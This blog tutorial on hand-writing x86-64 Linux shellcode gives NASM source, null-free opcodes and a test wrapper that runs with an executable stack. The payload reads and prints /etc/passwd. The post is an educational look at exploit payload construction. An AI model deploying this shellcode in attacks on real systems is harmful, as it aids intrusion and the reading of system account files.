---
layout: post
title: Basic Shellcode
categories: [shellcode]
tags: [shellcode, asm]
description: Introduction to shellcode on a Linux system.
---

# 1. Surroundings
```bash
$ uname -a
Linux debian 3.16.0-4-amd64 #1 SMP Debian 3.16.39-1+deb8u2 (2017-03-07) x86_64 GNU/Linux

$ lsb_release -a
No LSB modules are available.
Distributor ID:	Debian
Description:	Debian GNU/Linux 8.7 (jessie)
Release:	8.7
Codename:	jessie

$ gcc --version
gcc (Debian 4.9.2-10) 4.9.2

$ nasm -v
NASM version 2.11.05 compiled on Sep  9 2014

$ ld --version
GNU ld (GNU Binutils for Debian) 2.25
```

# 2. Explanation

This is the first post of a little series concerning differents shellcode types. This first post will show you the most basic shellcode that exist. Writting shellcode is an very advanced art which need advanced assembly knowledge. The example I will show you isn't the most optimized but I'am the one who wrote it! Last thing before begin, this post will not explain to you the shellcode definition (because there are a lot of tutorial on internet) but I will show you an example of shellcode writting from A to Z.

To write the shellcode, I will use the Intel syntax because I prefer it compare to AT&T syntax.

Our shellcode goal will be to read the "/etc/passwd". To do it we will not use "execve" syscall (to add a bit of difficulty) but we will use "open/read/write" syscall!

In C language, our shellcode will look like this:

```c
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>

int main(void) {
  int fd;
  int size;
  char buffer[4096];

  fd = open("/etc/passwd", O_RDONLY);
  size = read(fd, buffer, 4096);
  write(1, buffer, size);
  exit(0);
}
```

Now we will translate this code in ASM x64 with the shellcode condition!

# 3. Shellcode writting
So we first call a function and define our file path under the call to pop its value in the future register.

To remind, the "open" syscall is defined like: 

```c
int open(const char *pathname, int flags);
```

So the register value will look like:

```bash
(syscall number, get from "/usr/include/asm/unistd_64.h") =>    RAX=2
(1st argument)                                            =>    RDI="/etc/passwd"
(2nd argument)                                            =>    RSI="0000"
```

The code for the open syscall will look like:

```nasm
_start:
        jmp L1                      ; Jump to the first label
L2:
        pop rdi                     ; We pop the define string (file) in RDI
        xor byte [rdi + 11], 0x41   ; We set the last character of the path to "\0"
        xor rax, rax
        add al, 0x2                 ; We set 2 in al (the down part of AX, also the down part of EAX and also of RAX)
        xor rsi, rsi                ; We set RSI to 0
        syscall
L1:
        call L2                     ; We call the main function
        file: db "/etc/passwdA"     ; We define the file string (the A at end is for the future "\0")
```

The next steps will be to read the content of the file descriptor return by the previous open syscall, display it on the standard output, and then exit the program. This part is very easy so I will not detail it a lot.
To remind, the syscalls definition we will need look like:

```c
ssize_t read(int fd, void *buf, size_t count);
ssize_t write(int fd, const void *buf, size_t count);
void exit(int status);
```

And then the code to do it.

```nasm
        mov rdi, rax     ; We move the fd get from "open" to RDI
        lea rsi, [rsp]   ; We load the content of RSP to RSI
        xor rdx, rdx
        mov dx, 0xfff    ; We set RDX to 4095
        xor rax, rax     ; We set RAX to 0
        syscall

        xor rdi, rdi
        mov dil, 0x1     ; We set dil (down part of DI, EDI, RDI) to 1
        mov rdx, rax     ; We set rdx to the data size we get from read syscall
        xor rax, rax
        mov al, 0x1      ; We set al to 1
        syscall

        xor rax, rax
        mov al, 0x3c     ; We set RAX to 60 (exit syscall number)
        syscall
```

# 4. The shellcode
The whole shellcode will look like this:

```nasm
_start:
        jmp L1
L2:
        pop rdi
        xor byte [rdi + 11], 0x41
        xor rax, rax
        add al, 0x2
        xor rsi, rsi
        syscall

        mov rdi, rax
        lea rsi, [rsp]
        xor rdx, rdx
        mov dx, 0xfff
        xor rax, rax
        syscall

        xor rdi, rdi
        mov dil, 0x1
        mov rdx, rax
        xor rax, rax
        mov al, 0x1
        syscall

        xor rax, rax
        mov al, 0x3c
        syscall
L1:
        call L2
        file: db "/etc/passwdA"
```

Now we will assemble, compile and check the shellcode opcodes to see if there is "00" bytes.

```bash
$ nasm -f elf64 shellcode.s -o shellcode.o

$ ld -o shellcode shellcode.o             
ld: warning: cannot find entry symbol _start; defaulting to 0000000000400080

$ objdump -d shellcode

shellcode:     file format elf64-x86-64


Disassembly of section .text:

0000000000400080 <_start>:
  400080:	eb 39                	jmp    4000bb <L1>

0000000000400082 <L2>:
  400082:	5f                   	pop    %rdi
  400083:	80 77 0b 41          	xorb   $0x41,0xb(%rdi)
  400087:	48 31 c0             	xor    %rax,%rax
  40008a:	04 02                	add    $0x2,%al
  40008c:	48 31 f6             	xor    %rsi,%rsi
  40008f:	0f 05                	syscall 
  400091:	48 89 c7             	mov    %rax,%rdi
  400094:	48 8d 34 24          	lea    (%rsp),%rsi
  400098:	48 31 d2             	xor    %rdx,%rdx
  40009b:	66 ba ff 0f          	mov    $0xfff,%dx
  40009f:	48 31 c0             	xor    %rax,%rax
  4000a2:	0f 05                	syscall 
  4000a4:	48 31 ff             	xor    %rdi,%rdi
  4000a7:	40 b7 01             	mov    $0x1,%dil
  4000aa:	48 89 c2             	mov    %rax,%rdx
  4000ad:	48 31 c0             	xor    %rax,%rax
  4000b0:	b0 01                	mov    $0x1,%al
  4000b2:	0f 05                	syscall 
  4000b4:	48 31 c0             	xor    %rax,%rax
  4000b7:	b0 3c                	mov    $0x3c,%al
  4000b9:	0f 05                	syscall 

00000000004000bb <L1>:
  4000bb:	e8 c2 ff ff ff       	callq  400082 <L2>

00000000004000c0 <file>:
  4000c0:	2f                   	(bad)  
  4000c1:	65 74 63             	gs je  400127 <file+0x67>
  4000c4:	2f                   	(bad)  
  4000c5:	70 61                	jo     400128 <file+0x68>
  4000c7:	73 73                	jae    40013c <file+0x7c>
  4000c9:	77 64                	ja     40012f <file+0x6f>
  4000cb:	41                   	rex.B
```

It might be correct. There is no "00" bytes. Now a little trick to extract the opcode from the binary:

```bash
$ for i in `objdump -d shellcode | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}$' ` ; do echo -n "\\\x$i" ; done
\xeb\x39\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x48\x89\xc7\x48\x8d\x34\x24\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\xb7\x01\x48\x89\xc2\x48\x31\xc0\xb0\x01\x0f\x05\x48\x31\xc0\xb0\x3c\x0f\x05\xe8\xc2\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41%
```

We can now test it!
# 5. Demonstration
A little C wrapper to test the shellcode:

```c
#include <stdio.h>
#include <string.h>

char shellcode[] = "\xeb\x39\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x48\x89\xc7\x48\x8d\x34\x24\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\xb7\x01\x48\x89\xc2\x48\x31\xc0\xb0\x01\x0f\x05\x48\x31\xc0\xb0\x3c\x0f\x05\xe8\xc2\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41";

int main(void) {
  printf("Shellcode length: %d\n", strlen(shellcode));
  (*(void (*)()) shellcode)();
  return 0;
}
```

We now compile it without the none stack exec protection and run it:

```bash
$ gcc wrapper.c -z execstack

$ ./a.out 
Shellcode length: 76
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
...
```

Done.

A good shellcode references website: [http://shell-storm.org/shellcode/]()
